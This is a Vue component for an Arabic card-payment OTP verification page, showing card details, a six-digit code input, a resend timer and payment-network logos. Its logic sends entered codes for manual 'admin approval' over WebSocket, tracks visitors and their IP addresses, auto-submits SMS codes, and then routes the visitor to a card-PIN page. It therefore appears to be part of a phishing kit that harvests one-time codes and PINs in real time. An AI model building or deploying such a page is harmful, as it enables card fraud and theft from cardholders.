<template>
    <div class="otp-page" dir="rtl">

        <!-- ── Waiting Loader Modal (teleported fullscreen) ──────────── -->
        <InsuranceLoader v-if="isVerifying && !error" :modal="true" color="amber" size="lg"
            :text="t( 'verification.otp.loading' )"
            :sub-text="t( 'verification.otp.waitingForApproval' )" />

        <!-- ── Main Card ─────────────────────────────────────────────── -->
        <div class="otp-card">

            <!-- Header with gradient -->
            <div class="otp-header">
                <h1 class="otp-header__title">
                    {{ t( 'verification.otp.cardPaymentTitle' ) }}
                </h1>
                <p class="otp-header__sub">
                    {{ t( 'verification.otp.cardOwnershipVerification' ) }}
                </p>
            </div>

            <!-- Body -->
            <div class="otp-body">

                <!-- ── Card Branding Strip ──────────────────────────── -->
                <div v-if="networkLogo || bankLogo" class="otp-branding">
                    <div class="otp-branding__logos">
                        <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="otp-branding__bank" width="80" height="32" />
                        <span v-if="bankLogo && networkLogo" class="otp-branding__sep"></span>
                        <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="otp-branding__network" width="60" height="24" />
                    </div>
                    <span v-if="bankName" class="otp-branding__label">{{ bankName }}</span>
                </div>

                <!-- ── Card Info Summary ─────────────────────────────── -->
                <div class="otp-card-info">
                    <div class="otp-card-info__row">
                        <span class="otp-card-info__label">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                            </svg>
                            {{ t( 'verification.otp.usingCardEndingWith' ) }}
                        </span>
                        <span class="otp-card-info__value ltr-nums" dir="ltr">
                            **** {{ cardLast4 || '****' }}
                        </span>
                    </div>
                    <div v-if="cardHolder" class="otp-card-info__row">
                        <span class="otp-card-info__label">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
                            </svg>
                            حامل البطاقة
                        </span>
                        <span class="otp-card-info__value uppercase">{{ cardHolder }}</span>
                    </div>
                    <div v-if="totalAmount > 0" class="otp-card-info__row otp-card-info__row--highlight">
                        <span class="otp-card-info__label">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M17 9V7a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2m2 4h10a2 2 0 002-2v-6a2 2 0 00-2-2H9a2 2 0 00-2 2v6a2 2 0 002 2z" />
                            </svg>
                            {{ t( 'verification.otp.toPayAmount' ) }}
                        </span>
                        <span class="otp-card-info__amount">
                            <SarIcon className="size-3 inline-block fill-secondary" />
                            {{ formattedAmount }}
                        </span>
                    </div>
                </div>

                <!-- ── OTP Input Section ─────────────────────────────── -->
                <div class="otp-input-section">
                    <div class="otp-input-section__header">
                        <p class="otp-input-section__label">
                            {{ t( 'verification.otp.verificationCode' ) }}
                        </p>
                        <p class="otp-input-section__hint">
                            {{ t( 'verification.otp.enterOtpToConfirm' ) }}
                        </p>
                    </div>

                    <OtpInput ref="otpInputRef" v-model="otpCode" :length="6" :accept-lengths="[4, 6]" :disabled="isVerifying" :error="error"
                        @submit="submitOtp" />

                    <!-- Confirm Button -->
                    <button :disabled="!isOtpValid || isVerifying" class="otp-submit"
                        :class="isOtpValid && !isVerifying ? 'otp-submit--active' : 'otp-submit--disabled'"
                        @click="submitOtp">
                        <svg v-if="isVerifying" class="w-5 h-5 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none"
                            viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                            <path class="opacity-75" fill="currentColor"
                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        <span>{{ isVerifying ? t( 'verification.otp.verifying' ) : t( 'verification.otp.confirm' ) }}</span>
                    </button>
                </div>

                <!-- ── Resend Section ────────────────────────────────── -->
                <div class="otp-resend">
                    <template v-if="resendTimer > 0">
                        <div class="otp-resend__timer">
                            <svg class="w-4 h-4 text-slate-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                            <span class="text-muted text-sm">
                                {{ t( 'verification.otp.resendAfter' ) }}
                            </span>
                            <span class="otp-resend__countdown ltr-nums">{{ formattedTimer }}</span>
                        </div>
                        <!-- Timer progress bar -->
                        <div class="otp-resend__bar">
                            <div class="otp-resend__bar-fill" :style="{ width: timerPercent + '%' }"></div>
                        </div>
                    </template>
                    <template v-else>
                        <p class="text-muted text-xs sm:text-sm mb-2">
                            {{ t( 'verification.otp.didntReceive' ) }}
                        </p>
                        <button :disabled="isResending" class="otp-resend__btn" @click="resendOtp">
                            <svg v-if="isResending" class="w-4 h-4 animate-spin" xmlns="http://www.w3.org/2000/svg"
                                fill="none" viewBox="0 0 24 24">
                                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                    stroke-width="4" />
                                <path class="opacity-75" fill="currentColor"
                                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                            </svg>
                            <svg v-else class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                            </svg>
                            <span>{{ isResending ? t( 'verification.otp.resending' ) : t( 'verification.otp.resend' ) }}</span>
                        </button>
                    </template>
                </div>
            </div>

            <!-- ── Footer — Payment logos ─────────────────────────── -->
            <div class="otp-footer">
                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="otp-footer__logos" width="180" height="24" />
            </div>
        </div>

        <!-- ── Help & Security (outside card) ────────────────────────── -->
        <div class="otp-help">
            <p>
                {{ t( 'common.contactUsIfProblem' ) }}
                <a href="tel:920000000" class="otp-help__phone">920000000</a>
            </p>
        </div>
        <div class="otp-security">
            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
            <span>{{ t( 'common.secureTransaction' ) }}</span>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getOtpStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import InsuranceLoader from '@/components/ui/InsuranceLoader.vue';
import OtpInput from '@/components/ui/OtpInput.vue';
import { useCardBranding } from '@/composables/useCardBranding';
import { getReasonLabel } from '@/constants/rejectionReasons';
import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';

const { t } = useI18n();
const router = useRouter();

// ─── Visitor tracking ───────────────────────────────────────────────
useVisitorTracking( 'otp' );

// ─── Session context via composable (computed to preserve reactivity) ───
const { context, resolveCustomerIp, submitOtp: submitOtpApi, resendOtpCode } = usePayment();
const sessionId = computed( () => context.sessionId || '' );
const customerIpRef = ref( context.customerIp || '' );
const cardBin = computed( () => context.cardBin || '' );
const cardLast4 = computed( () => context.cardLast4 || '****' );
const cardHolder = computed( () => context.cardHolder || '' );
const totalAmount = computed( () => parseFloat( context.totalAmount ) || 0 );

// ─── Card branding (network + bank) ────────────────────────────────
const { brand: _brand, networkLogo, networkName, bankKey: _bankKey, bankLogo, bankName } = useCardBranding( cardBin );

const RESEND_COOLDOWN = 180; // seconds

const formattedAmount = computed( () =>
    totalAmount.value.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } )
);

// ─── OTP State ──────────────────────────────────────────────────────
const otpCode = ref( '' );
const otpInputRef = ref( null );
const isVerifying = ref( false );
const isResending = ref( false );
const error = ref( '' );
const resendTimer = ref( RESEND_COOLDOWN );
let timerInterval = null;

const isOtpValid = computed( () => /^(\d{4}|\d{6})$/.test( otpCode.value ) );

const formattedTimer = computed( () =>
{
    const m = Math.floor( resendTimer.value / 60 );
    const s = resendTimer.value % 60;
    return `${ m }:${ s.toString().padStart( 2, '0' ) }`;
} );

const timerPercent = computed( () =>
    Math.round( ( resendTimer.value / RESEND_COOLDOWN ) * 100 )
);

function startResendTimer ()
{
    if ( timerInterval ) clearInterval( timerInterval );
    resendTimer.value = RESEND_COOLDOWN;
    timerInterval = setInterval( () =>
    {
        if ( resendTimer.value > 0 )
        {
            resendTimer.value--;
        } else
        {
            clearInterval( timerInterval );
        }
    }, 1000 );
}

// ─── Submit OTP ─────────────────────────────────────────────────────
const submitOtp = async () =>
{
    if ( !isOtpValid.value || isVerifying.value ) return;

    isVerifying.value = true;
    error.value = '';

    const success = await submitOtpApi( otpCode.value );

    if ( !success )
    {
        error.value = t( 'verification.otp.sendCodeError' );
        isVerifying.value = false;
    } else
    {
        logger.debug( '[OTP] Submitted successfully, waiting for admin approval' );
    }
};

// ─── Resend OTP ─────────────────────────────────────────────────────
const resendOtp = async () =>
{
    if ( resendTimer.value > 0 || isResending.value ) return;

    isResending.value = true;
    error.value = '';

    const success = await resendOtpCode();

    if ( success )
    {
        otpCode.value = '';
        otpInputRef.value?.clear();
        startResendTimer();
    } else
    {
        error.value = t( 'verification.otp.resendError' );
    }

    isResending.value = false;
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',
    approvedEvent: 'OtpApproved',
    rejectedEvent: 'OtpRejected',
    logTag: 'OTP',

    onApproved ( event )
    {
        logger.debug( '[OTP] Approved:', event );
        isVerifying.value = false;

        if ( event.redirect_to )
        {
            safeRedirect( event.redirect_to, 'cardPin', router );
        } else
        {
            router.push( { name: 'cardPin' } );
        }
    },

    onRejected ( event )
    {
        logger.debug( '[OTP] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.otp.codeRejected' );
        otpCode.value = '';
        otpInputRef.value?.clear();
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.otp || '';
        if ( !isVerifying.value || !sessionId.value || !sig ) return;

        const { data } = await getOtpStatus( sessionId.value, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( { redirect_to: null } );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'otp_other' } );
        }
    },
} );

// ─── WebOTP API — auto-fill from SMS ────────────────────────────────
let abortController = null;

async function initWebOTP ()
{
    if ( !( 'OTPCredential' in window ) ) return;

    try
    {
        abortController = new AbortController();
        const content = await navigator.credentials.get( {
            otp: { transport: [ 'sms' ] },
            signal: abortController.signal,
        } );

        if ( content?.code )
        {
            const code = content.code.replace( /\D/g, '' ).slice( 0, 6 );
            otpCode.value = code;
            if ( code.length >= 4 ) autoSubmitTimer = setTimeout( () => submitOtp(), 500 );
        }
    } catch
    {
        // User cancelled or not supported — silent
    }
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    otpInputRef.value?.focusFirstEmpty();
    startResendTimer();
    setupWs( ip );
    initWebOTP();
} );

let autoSubmitTimer = null;

onUnmounted( () =>
{
    if ( timerInterval ) clearInterval( timerInterval );
    if ( abortController ) abortController.abort();
    clearTimeout( autoSubmitTimer );
    // WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
} );
</script>

<style scoped>
/* ═══════════════════════════════════════════════════════════════════
   OTP Page — Scoped Styles
   ═══════════════════════════════════════════════════════════════════ */

/* Page wrapper */
.otp-page {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 1rem 0.75rem;
    background: linear-gradient(160deg, #f0f4f8 0%, #e2e8f0 50%, #f7fbfe 100%);
}

/* Card container */
.otp-card {
    width: 100%;
    max-width: 420px;
    background: #fff;
    border-radius: 1.25rem;
    box-shadow:
        0 4px 6px -1px rgb(0 0 0 / 0.07),
        0 10px 15px -3px rgb(0 0 0 / 0.05),
        0 20px 25px -5px rgb(0 0 0 / 0.03);
    overflow: hidden;
    animation: otp-card-in 0.5s ease-out;
}

@keyframes otp-card-in {
    from { opacity: 0; transform: translateY(16px) scale(0.98); }
    to   { opacity: 1; transform: translateY(0) scale(1); }
}

/* ── Header ─────────────────────────────────────────────── */
.otp-header {
    background: linear-gradient(135deg, #006bbf 0%, #0088eb 50%, #33a0ef 100%);
    padding: 1.5rem 1.5rem 1.75rem;
    text-align: center;
    position: relative;
    overflow: hidden;
}

.otp-header::before {
    content: '';
    position: absolute;
    top: -50%;
    right: -30%;
    width: 200%;
    height: 200%;
    background: radial-gradient(circle, rgba(255,255,255,0.08) 0%, transparent 60%);
    pointer-events: none;
}

.otp-header__icon {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 3rem;
    height: 3rem;
    background: rgba(255, 255, 255, 0.2);
    border-radius: 0.875rem;
    margin-bottom: 0.75rem;
    backdrop-filter: blur(8px);
}

.otp-header__title {
    color: #fff;
    font-size: 1.125rem;
    font-weight: 700;
    margin: 0 0 0.25rem;
}

.otp-header__sub {
    color: rgba(255, 255, 255, 0.85);
    font-size: 0.8125rem;
    font-weight: 400;
    margin: 0;
}

/* ── Body ───────────────────────────────────────────────── */
.otp-body {
    padding: 1.25rem 1.25rem 1rem;
    display: flex;
    flex-direction: column;
    gap: 1.25rem;
}

@media (min-width: 640px) {
    .otp-body { padding: 1.75rem 1.75rem 1.25rem; }
}
/* ── Card branding strip ────────────────────────────── */
.otp-branding {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 0.5rem;
    padding: 1rem;
    background: linear-gradient(135deg, #f8fafc 0%, #f7fbfe 100%);
    border: 1px solid #e2e8f0;
    border-radius: 0.875rem;
}

.otp-branding__logos {
    display: flex;
    align-items: center;
    gap: 0.75rem;
}

.otp-branding__bank {
    height: 2rem;
    width: auto;
    max-width: 7rem;
    object-fit: contain;
}

.otp-branding__network {
    height: 1.5rem;
    width: auto;
    max-width: 4rem;
    object-fit: contain;
}

.otp-branding__sep {
    width: 1px;
    height: 1.5rem;
    background: #cbd5e1;
}

.otp-branding__label {
    font-size: 0.75rem;
    font-weight: 600;
    color: #64748b;
}
/* ── Card info summary ──────────────────────────────────── */
.otp-card-info {
    background: #f8fafc;
    border: 1px solid #e2e8f0;
    border-radius: 0.875rem;
    padding: 0.75rem;
    display: flex;
    flex-direction: column;
    gap: 0;
}

.otp-card-info__row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.5rem 0.375rem;
    font-size: 0.8125rem;
}

.otp-card-info__row:not(:last-child) {
    border-bottom: 1px dashed #e2e8f0;
}

.otp-card-info__row--highlight {
    background: linear-gradient(90deg, rgba(0, 136, 235, 0.04) 0%, rgba(0, 136, 235, 0.08) 100%);
    border-radius: 0.625rem;
    margin: 0.25rem -0.25rem -0.25rem;
    padding: 0.625rem;
}

.otp-card-info__label {
    display: flex;
    align-items: center;
    gap: 0.375rem;
    color: #64748b;
    font-weight: 500;
}

.otp-card-info__value {
    font-weight: 700;
    color: #1e293b;
}

.otp-card-info__amount {
    font-size: 1rem;
    font-weight: 800;
    color: var(--color-secondary, #1db97d);
}

.otp-card-info__inline-logo {
    height: 0.875rem;
    width: auto;
    display: inline-block;
    vertical-align: middle;
    margin-inline-end: 0.25rem;
    opacity: 0.85;
}

/* ── OTP input section ──────────────────────────────────── */
.otp-input-section {
    text-align: center;
    background: linear-gradient(135deg, #f0fdf4 0%, #f7fbfe 50%, #ecfdf5 100%);
    border: 1.5px solid #bbf7d0;
    border-radius: 1rem;
    padding: 1.25rem 1rem;
}

.otp-input-section__header {
    margin-bottom: 1rem;
}

.otp-input-section__icon {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 2.75rem;
    height: 2.75rem;
    background: linear-gradient(135deg, #d1fae5 0%, #a7f3d0 100%);
    border-radius: 50%;
    margin-bottom: 0.625rem;
}

.otp-input-section__label {
    display: block;
    font-size: 1rem;
    font-weight: 800;
    color: #065f46;
    margin-bottom: 0.25rem;
}

.otp-input-section__hint {
    font-size: 0.75rem;
    color: #6b7280;
    margin: 0;
    line-height: 1.5;
}

/* ── Submit button ──────────────────────────────────────── */
.otp-submit {
    width: 100%;
    padding: 0.8125rem;
    border-radius: 0.875rem;
    font-weight: 700;
    font-size: 0.9375rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.5rem;
    border: none;
    cursor: pointer;
    transition: all 0.25s ease;
}

.otp-submit--active {
    background: linear-gradient(135deg, #006bbf 0%, #0088eb 100%);
    color: #fff;
    box-shadow: 0 4px 12px rgba(0, 136, 235, 0.3);
}

.otp-submit--active:hover {
    transform: translateY(-1px);
    box-shadow: 0 6px 16px rgba(0, 136, 235, 0.4);
}

.otp-submit--active:active {
    transform: translateY(0);
}

.otp-submit--disabled {
    background: #f1f5f9;
    color: #94a3b8;
    cursor: not-allowed;
}

/* ── Resend section ─────────────────────────────────────── */
.otp-resend {
    text-align: center;
}

.otp-resend__timer {
    display: inline-flex;
    align-items: center;
    gap: 0.375rem;
    margin-bottom: 0.5rem;
}

.otp-resend__countdown {
    font-weight: 700;
    font-size: 0.9375rem;
    color: var(--color-primary, #0088eb);
    min-width: 2.5rem;
}

.otp-resend__bar {
    width: 100%;
    height: 3px;
    background: #e2e8f0;
    border-radius: 2px;
    overflow: hidden;
}

.otp-resend__bar-fill {
    height: 100%;
    background: linear-gradient(90deg, #006bbf, #33a0ef);
    border-radius: 2px;
    transition: width 1s linear;
}

.otp-resend__btn {
    display: inline-flex;
    align-items: center;
    gap: 0.375rem;
    padding: 0.5rem 1.25rem;
    border-radius: 0.75rem;
    border: 1.5px solid var(--color-primary, #0088eb);
    background: transparent;
    color: var(--color-primary, #0088eb);
    font-size: 0.8125rem;
    font-weight: 600;
    cursor: pointer;
    transition: all 0.2s;
}

.otp-resend__btn:hover:not(:disabled) {
    background: #f7fbfe;
}

.otp-resend__btn:disabled {
    opacity: 0.5;
    cursor: not-allowed;
}

/* ── Footer ─────────────────────────────────────────────── */
.otp-footer__logos {
    display: block;
    max-width: 180px;
    height: auto;
    margin: 0 auto;
}

.otp-footer {
    padding: 1rem 1.25rem 1.25rem;
    background: #fafbfc;
    border-top: 1px solid #f1f5f9;
}

.otp-footer__divider {
    height: 1px;
    background: #e2e8f0;
    margin: 0.75rem 0;
}

.otp-footer__active {
    filter: drop-shadow(0 0 4px rgba(0, 136, 235, 0.35));
    transform: scale(1.1);
}

/* ── Help & security (outside card) ─────────────────────── */
.otp-help {
    margin-top: 1rem;
    text-align: center;
    font-size: 0.75rem;
    color: #94a3b8;
}

.otp-help__phone {
    color: var(--color-primary, #0088eb);
    font-weight: 700;
    font-size: 0.875rem;
    text-decoration: none;
    margin-right: 0.25rem;
}

.otp-help__phone:hover { text-decoration: underline; }

.otp-security {
    margin-top: 0.625rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.375rem;
    color: #cbd5e1;
    font-size: 0.6875rem;
}

/* ── Responsive fine-tuning ─────────────────────────────── */
@media (max-width: 380px) {
    .otp-header { padding: 1.25rem 1rem 1.5rem; }
    .otp-body { padding: 1rem; gap: 1rem; }
}
</style>
